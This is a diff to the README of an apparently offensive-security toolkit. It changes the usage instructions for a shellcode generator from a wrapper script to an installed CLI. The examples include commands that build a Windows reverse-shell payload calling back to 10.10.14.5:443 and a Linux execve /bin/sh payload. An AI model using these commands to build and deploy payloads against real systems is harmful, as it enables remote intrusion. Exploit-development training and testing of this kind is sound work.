@@ -18,12 +18,16 @@ A comprehensive collection of Python-based security testing tools for exploit de
 Generate position-independent shellcode for Windows (x86/x64) and Linux (ARM/ARM64) with automatic bad character encoding, ROP13 hash-based API resolution, and multiple output formats.
 
 ```bash
-# Windows x64 reverse shell
-cd shellgen && ./shellgen.sh --platform windows --payload reverse_shell \
+# Windows x64 reverse shell (after installation)
+shellgen --platform windows --payload reverse_shell \
   --host 10.10.14.5 --port 443 --arch x64
 
 # Linux ARM64 command execution
-./shellgen.sh --platform linux --payload execve --cmd "/bin/sh" --arch arm64
+shellgen --platform linux --payload execve --cmd "/bin/sh" --arch arm64
+
+# Or run directly without installation:
+cd shellgen && ./shellgen_cli.py --platform windows --payload reverse_shell \
+  --host 10.10.14.5 --port 443 --arch x64
 ```
 
 **Key Features:**
@@ -111,8 +115,13 @@ pip install -r requirements.txt
 
 #### Generate Windows Shellcode
 ```bash
+# After installation
+shellgen --platform windows --payload messagebox \
+  --title "Test" --message "Hello!" --arch x86
+
+# Or run directly
 cd shellgen
-./shellgen.sh --platform windows --payload messagebox \
+./shellgen_cli.py --platform windows --payload messagebox \
   --title "Test" --message "Hello!" --arch x86
 ```
 
@@ -165,7 +174,6 @@ rop_tools/
 │   │       ├── windows.py    # Windows shellcode
 │   │       └── linux.py      # Linux shellcode
 │   ├── shellgen_cli.py       # Main entry point
-│   ├── shellgen.sh           # Wrapper script
 │   ├── hash_generator.py     # ROR13 hash tool
 │   └── tests/                # Test suite
 │
